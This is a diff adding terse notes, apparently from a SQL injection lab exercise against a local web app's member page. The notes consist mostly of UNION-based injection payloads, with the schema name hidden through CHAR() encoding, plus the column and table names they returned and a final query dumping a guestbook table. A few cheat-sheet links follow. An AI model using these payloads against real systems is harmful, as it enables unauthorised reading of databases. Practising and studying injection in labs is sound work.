@@ -1,0 +1,43 @@
+CONCAT(CHAR(77), CHAR(101), CHAR(109), CHAR(98), CHAR(101), CHAR(114), CHAR(95), CHAR(103), CHAR(117), CHAR(101), CHAR(115), CHAR(116), CHAR(98), CHAR(111), CHAR(111), CHAR(107))
+
+-----------------------------------------------
+
+http://192.168.1.34/index.php
+?page=member
+&id=-1 union select column_name,0 from information_schema.columns where table_schema=CONCAT(CHAR(77), CHAR(101), CHAR(109), CHAR(98), CHAR(101), CHAR(114), CHAR(95), CHAR(103), CHAR(117), CHAR(101), CHAR(115), CHAR(116), CHAR(98), CHAR(111), CHAR(111), CHAR(107))
+&Submit=Submit 
+
+
+
+ID: -1 union select column_name,0 from information_schema.columns where table_schema=CONCAT(CHAR(77), CHAR(101), CHAR(109), CHAR(98), CHAR(101), CHAR(114), CHAR(95), CHAR(103), CHAR(117), CHAR(101), CHAR(115), CHAR(116), CHAR(98), CHAR(111), CHAR(111), CHAR(107)) 
+First name: id_comment
+Surname : 0
+ID: -1 union select column_name,0 from information_schema.columns where table_schema=CONCAT(CHAR(77), CHAR(101), CHAR(109), CHAR(98), CHAR(101), CHAR(114), CHAR(95), CHAR(103), CHAR(117), CHAR(101), CHAR(115), CHAR(116), CHAR(98), CHAR(111), CHAR(111), CHAR(107)) 
+First name: comment
+Surname : 0
+ID: -1 union select column_name,0 from information_schema.columns where table_schema=CONCAT(CHAR(77), CHAR(101), CHAR(109), CHAR(98), CHAR(101), CHAR(114), CHAR(95), CHAR(103), CHAR(117), CHAR(101), CHAR(115), CHAR(116), CHAR(98), CHAR(111), CHAR(111), CHAR(107)) 
+First name: name
+Surname : 0
+
+------------------------------------------------
+http://192.168.1.34/index.php
+
+?page=member
+&id=-1 UNION ALL SELECT NULL,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema=CONCAT(CHAR(77), CHAR(101), CHAR(109), CHAR(98), CHAR(101), CHAR(114), CHAR(95), CHAR(103), CHAR(117), CHAR(101), CHAR(115), CHAR(116), CHAR(98), CHAR(111), CHAR(111), CHAR(107))
+&Submit=Submit
+
+
+db: guestbook
+
+
+------------------------------------------------
+
+http://192.168.1.34/index.php
+?page=member
+&id=-1 union select name, comment from Member_guestbook.guestbook
+&Submit=Submit
+
+http://www.securityidiots.com/Web-Pentest/SQL-Injection/Error-Based-Injection-Subquery-Injection.html?fbclid=IwAR0HPvoSbbT6P75APiSM-CWF5h1zJ6FX6O-elPgTmF_NE1xVMD1sREhMjNk
+https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#UsingIntegers
+https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/
+https://docs.microsoft.com/en-us/sql/relational-databases/system-information-schema-views/system-information-schema-views-transact-sql?view=sql-server-ver15
